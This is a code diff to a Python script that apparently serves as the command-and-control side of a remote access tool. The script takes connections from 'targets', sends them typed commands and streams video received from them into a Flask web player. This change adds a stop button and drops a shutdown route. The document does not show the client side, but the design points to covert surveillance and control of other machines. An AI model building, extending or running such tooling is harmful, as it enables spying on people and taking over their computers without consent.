@@ -1,35 +1,66 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, request
+from flask import Flask, Response, request, render_template_string
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
+import sys
+import os
 
 init(autoreset=True)
 
 app = Flask(__name__)
 clients = {}
 server_thread = None
+streaming = False
+
+# HTML template for video streaming with a stop button
+html_template = """
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Video Streaming</title>
+  </head>
+  <body>
+    <h1>Video Streaming</h1>
+    <div>
+      <img src="{{ url_for('video_feed') }}" width="640" height="480">
+    </div>
+    <button onclick="stopStreaming()">Stop Streaming</button>
+    <script>
+      function stopStreaming() {
+        fetch('/stop_streaming')
+          .then(response => response.text())
+          .then(data => alert(data));
+      }
+    </script>
+  </body>
+</html>
+"""
 
 def start_streaming(client_socket, mode):
+    global streaming
+    streaming = True
     print(Fore.BLUE + "[ * ] Starting...")
     time.sleep(1)
     print(Fore.BLUE + "[ * ] Preparing player...")
     time.sleep(1)
 
     @app.route('/')
+    def index():
+        return render_template_string(html_template)
+
+    @app.route('/video_feed')
     def video_feed():
         return Response(generate_frames(client_socket),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-    @app.route('/k', methods=['POST', 'GET'])
-    def kill_server():
-        if request.method == 'POST':
-            shutdown_server()
-            return 'Server shutting down...'
-        else:
-            return 'Send a POST request to shut down the server.'
+    @app.route('/stop_streaming')
+    def stop_streaming():
+        global streaming
+        streaming = False
+        return "Streaming stopped", 200
 
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
@@ -37,14 +68,9 @@ def start_streaming(client_socket, mode):
     # Run the Flask app in a separate thread to handle the streaming
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
 
-def shutdown_server():
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        raise RuntimeError('Not running with the Werkzeug Server')
-    func()
-
 def generate_frames(client_socket):
-    while True:
+    global streaming
+    while streaming:
         data = client_socket.recv(921600)
         if not data:
             break
@@ -53,6 +79,7 @@ def generate_frames(client_socket):
         frame = buffer.tobytes()
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
@@ -124,6 +151,7 @@ def handle_client(client_socket, addr):
             continue
 
         client_socket.send(command.encode('utf-8'))
+
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
